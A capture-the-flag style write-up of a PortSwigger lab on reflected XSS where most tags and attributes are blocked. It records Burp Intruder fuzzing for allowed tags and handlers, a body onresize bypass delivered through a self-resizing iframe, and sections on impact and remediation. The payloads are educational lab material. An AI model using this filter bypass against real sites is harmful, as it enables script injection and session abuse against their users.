# Reflected XSS into HTML Context with Most Tags and Attributes Blocked

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Category:** Reflected Cross-Site Scripting (XSS)  
**Status:** Solved  
**Tools:** Firefox

## Objective

Exploit a reflected XSS vulnerability by identifying HTML tags and event handlers allowed by the application's filtering mechanism and bypassing the restrictions using an alternative HTML element and event handler.

## Methodology

### 1. Initial Testing

1. Submitted a standard XSS payload using an image element:

   `<img src=1 onerror=print()>`

2. Observed that the application blocked the payload.
3. Intercepted the search request using Burp Suite and sent it to Burp Intruder.

### 2. HTML Tag Discovery

1. Replaced the search parameter with an empty HTML element: `<>`.
2. Created a payload position between the angle brackets.
3. Used the PortSwigger XSS Cheat Sheet to obtain a list of HTML tags.
4. Loaded the tags into Burp Intruder and launched the attack.
5. Analyzed the HTTP responses and identified that the `body` tag returned HTTP 200, while most other tags returned HTTP 400.

### 3. Event Handler Discovery

1. Tested the `body` element using the input:

   `<body%20=1>`

2. Created a payload position before the equals sign.
3. Loaded the event-handler list from the PortSwigger XSS Cheat Sheet.
4. Used Burp Intruder to identify permitted event handlers.
5. Observed that `onresize` returned HTTP 200, while most other attributes returned HTTP 400.

### 4. Exploitation

1. Created an exploit using an iframe pointing to the vulnerable search functionality.
2. Injected a `body` element with the `onresize` event handler.
3. Configured the iframe to resize after loading.
4. Stored the exploit on the exploit server.
5. Delivered the exploit to the victim.
6. Successfully triggered the JavaScript print function.

## Payloads

### Initial Test

```html
<img src=1 onerror=print()>
```

### Allowed HTML Element

```html
<body>
```

### Allowed Event Handler

```html
onresize
```

### Final Exploit

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

**JavaScript function:** `print()`

## Vulnerability

The application reflected user-controlled search input into an HTML context but implemented restrictive filtering that blocked most HTML tags and event handlers.

By systematically testing HTML tags and event attributes using Burp Intruder, it was possible to identify an allowed combination:

- HTML element: `body`
- Event handler: `onresize`

The exploit used an iframe whose width changed after loading, triggering the `onresize` event and executing the injected JavaScript.

## Impact

An attacker could potentially:

- Execute JavaScript in a victim's browser.
- Manipulate website content and behavior.
- Perform unauthorized actions within the victim's session.
- Conduct phishing attacks.
- Exploit trusted application functionality through injected content.

## Remediation

- Apply context-aware output encoding to all user-controlled input.
- Avoid relying on blacklists of HTML tags and event handlers.
- Use robust HTML sanitization libraries with strict allowlists.
- Prevent untrusted input from being interpreted as executable HTML.
- Implement a restrictive Content Security Policy (CSP).
- Use safe DOM APIs when dynamically inserting content.

## Evidence

<img width="936" height="690" alt="image" src="https://github.com/user-attachments/assets/d8dc108e-4910-438f-a638-854facb6ad1c" />
<img width="1331" height="557" alt="image" src="https://github.com/user-attachments/assets/35fcf666-61d0-42b9-94b3-3eed72eb69f6" />
<img width="1540" height="997" alt="image" src="https://github.com/user-attachments/assets/689f20f1-cf1b-42c6-acb6-85f12caec32a" />
<img width="1547" height="272" alt="image" src="https://github.com/user-attachments/assets/e42303d3-b8f9-4f4a-bfcf-863e46e09f71" />



## Lab Reference

PortSwigger Web Security Academy – Reflected XSS into HTML context with most tags and attributes blocked.
